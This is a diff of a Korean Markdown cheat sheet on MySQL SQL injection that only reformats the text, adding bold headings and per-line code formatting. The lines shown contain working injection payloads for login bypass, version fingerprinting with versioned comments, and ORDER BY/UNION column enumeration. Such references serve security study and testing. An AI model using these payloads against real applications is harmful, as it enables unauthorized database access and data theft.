@@ -19,7 +19,7 @@ information_schema 는 MySQL 서버가 운영하는 모든 다른 데이터베�
 False 는 쿼리가 유효하지 않음을 나타냄. (MySQL 에러 / 웹 사이트의 누락된 컨텐츠)<br>
 True 는 쿼리가 유효함을 의미함. (내용이 평소대로 표시됨)<br><br>
 
-① 문자열<br><br>
+**① 문자열**<br><br>
 
 주어진 쿼리 `SELECT * FROM Table WHERE id = '1';`<br>
 
@@ -39,7 +39,7 @@ True 는 쿼리가 유효함을 의미함. (내용이 평소대로 표시됨)<br
 따옴표 일련 뒤에 명령문을 계속 입력하는 것도 가능함.<br>
 따옴표는 따옴표를 벗어나게 함.<br><br>
 
-② 숫자형<br><br>
+**② 숫자형**<br><br>
 
 주어진 쿼리 `SELECT * FROM Table WHERE id = 1;`<br>
 
@@ -59,17 +59,17 @@ AND false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓<br>
 참은 1 과 같음.<br>
 거짓은 0 과 같음.<br><br>
 
-③ 로그인<br><br>
+**③ 로그인**<br><br>
 
 주어진 쿼리 `SELECT * FROM Table WHERE username = '';`<br><br>
 
-`' OR '1<br>
-' OR 1 -- -<br>
-" OR "" = "<br>
-" OR 1 = 1 -- -<br>
-'='<br>
-'LIKE'<br>
-'=0--+`<br><br>
+`' OR '1`<br>
+`' OR 1 -- -`<br>
+`" OR "" = "`<br>
+`" OR 1 = 1 -- -`<br>
+`'='`<br>
+`'LIKE'`<br>
+`'=0--+`<br><br>
 
 예 :<br>
 `SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';`<br><br><br>
@@ -94,7 +94,7 @@ SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';`<br><br>
 
 ## (4) 버전 테스팅
 
-① 변수<br><br>
+**① 변수**<br><br>
 
 `VERSION()<br>
 @@VERSION<br>
@@ -107,16 +107,16 @@ SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';`<br><br>
 DBMS 가 윈도우 기반 시스템에서 실행되는 경우 결과값에는 -nt-log 가 포함됨.<br>
 @@GLOBAL 는 글로벌 변수를 의미하며 글로벌 변수 지정은 슈퍼 권한이 있어야 함.<br><br>
 
-② 특정 코드<br><br>
+**② 특정 코드**<br><br>
 
 `/*!버전 특정 코드*/`<br><br>
 
 예 :<br>
 `주어진 쿼리 SELECT * FROM Users limit 1,{INJECTION POINT};`<br><br>
 
-`1 /*!50094eaea*/; 거짓 - 버전이 5.00.94 이상임.<br>
-1 /*!50096eaea*/; 참 - 버전이 5.00.96 보다 작음.<br>
-1 /*!50095eaea*/; 거짓 - 버전이 5.00.95 와 같음.`<br><br>
+`1 /*!50094eaea*/; 거짓 - 버전이 5.00.94 이상임.`<br>
+`1 /*!50096eaea*/; 참 - 버전이 5.00.96 보다 작음.`<br>
+`1 /*!50095eaea*/; 거짓 - 버전이 5.00.95 와 같음.`<br><br>
 
 노트 :<br>
 주입 위치로 인해 더 이상 SQL 쿼리에 추가할 수 없는 상황에서 버전을 판별하는 데 유용할 수 있음.<br>
@@ -185,11 +185,11 @@ GROUP BY 와 ORDER BY 는 SQL 에서 다른 기능을 가지고 있지만 정확
 예 : <br>
 `주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';`<br><br>
 
-`1' ORDER BY 1--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
-1' ORDER BY 2--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
-1' ORDER BY 3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
-1' ORDER BY 4--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.<br>
--1' UNION SELECT 1,2,3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br><br>`
+`1' ORDER BY 1--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
+`1' ORDER BY 2--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
+`1' ORDER BY 3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
+`1' ORDER BY 4--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.`<br>
+`-1' UNION SELECT 1,2,3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br><br>
 
 ⓑ 에러 기반(Error Based)1<br><br>
 
@@ -201,8 +201,8 @@ GROUP/ORDER BY 1,2,3,4,5...<br><br>
 예 :<br>
 `주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}'`<br><br>
 
-`1' GROUP BY 1,2,3,4,5--+  그룹 문에서 알 수 없는 열 '4'<br>
-1' ORDER BY 1,2,3,4,5--+  Order 절에서 알수 없는 열 '4'`<br><br>
+`1' GROUP BY 1,2,3,4,5--+  그룹 문에서 알 수 없는 열 '4'`<br>
+`1' ORDER BY 1,2,3,4,5--+  Order 절에서 알수 없는 열 '4'`<br><br>
 
 ⓒ 에러 기반2<br><br>
 
